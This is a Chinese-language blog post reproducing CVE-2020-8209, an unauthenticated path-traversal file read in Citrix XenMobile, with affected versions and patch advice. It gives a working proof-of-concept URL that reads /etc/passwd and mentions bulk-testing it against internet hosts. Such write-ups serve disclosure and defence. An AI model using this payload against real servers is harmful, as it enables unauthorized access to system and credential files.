![1610718892_60019eac2b8931d1ac3bc.png!small](https://image.3001.net/images/20210115/1610718892_60019eac2b8931d1ac3bc.png!small)

CVE-2020-8209（Citrix Endpoint Management 任意文件读取）

* * *

## 一、漏洞描述：

XenMobile是Citrix开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。

Citrix Endpoint Management 存在 任意文件读取漏洞，远程未授权攻击者 通过 发送特制HTTP请求，可以造成
读取受影响设备上任意文件 的影响。

## 二、影响版本

以下版本受到严重影响

XenMobile Server < 10.12 RP2

XenMobile Server < 10.11 RP4

XenMobile Server < 10.10 RP6

XenMobile Server < 10.9 RP5

以下版本受到中等影响

XenMobile Server < 10.12 RP3

XenMobile Server < 10.11 RP6

XenMobile Server < 10.10 RP6

XenMobile Server < 10.9 RP5

## 三、漏洞复现

POC很简单：直接访问url路径就是

  

  

/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd

![1610718892_60019eac8e0640f15aab9.png!small](https://image.3001.net/images/20210115/1610718892_60019eac8e0640f15aab9.png!small)

直接访问就下载文件了

![1610718893_60019ead0911d3d9ee895.png!small](https://image.3001.net/images/20210115/1610718893_60019ead0911d3d9ee895.png!small)

![1610718893_60019ead86a1787b4fb99.png!small](https://image.3001.net/images/20210115/1610718893_60019ead86a1787b4fb99.png!small)

尝试批量跑了一下（基本上国外的较多使用）：

![1610718894_60019eae2240cc30374d5.png!small](https://image.3001.net/images/20210115/1610718894_60019eae2240cc30374d5.png!small)

## 四、修补建议：

根据版本安装修补程序

XenMobile Server 10.12 RP3 XenMobile Server 10.11 RP6 XenMobile Server 10.10
RP6 XenMobile Server 10.9 RP5

## 参考：

https://cert.360.cn/warning/detail?id=c90721afed448a76134344672230c3ae

https://mp.weixin.qq.com/s/6s97cZepY11_IQDYD0bFwA（阿乐）

https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=CVE-2020-8209&fenlei=256&rsv_pq=a1f844480001758e&rsv_t=1cadbCZbwvAVhODBaYHphFmUgW3X9adpsH653gIO9l58hEDsKAE7iGLmXdA&rqlang=cn&rsv_enter=1&rsv_dl=tb&rsv_sug3=2&rsv_sug1=1&rsv_sug7=001&rsv_sug2=0&rsv_btype=i&prefixsug=%2526lt%253BV%2526gt%253B-2020-8209&rsp=5&rsv_sug9=es_0_1&inputT=373&rsv_sug4=387&rsv_sug=9

* * *

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610718895_60019eaf75cf0c28b809f.jpg!small](https://image.3001.net/images/20210115/1610718895_60019eaf75cf0c28b809f.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

![1610718895_60019eafd5b622b56bf99.png!small](https://image.3001.net/images/20210115/1610718895_60019eafd5b622b56bf99.png!small)

  

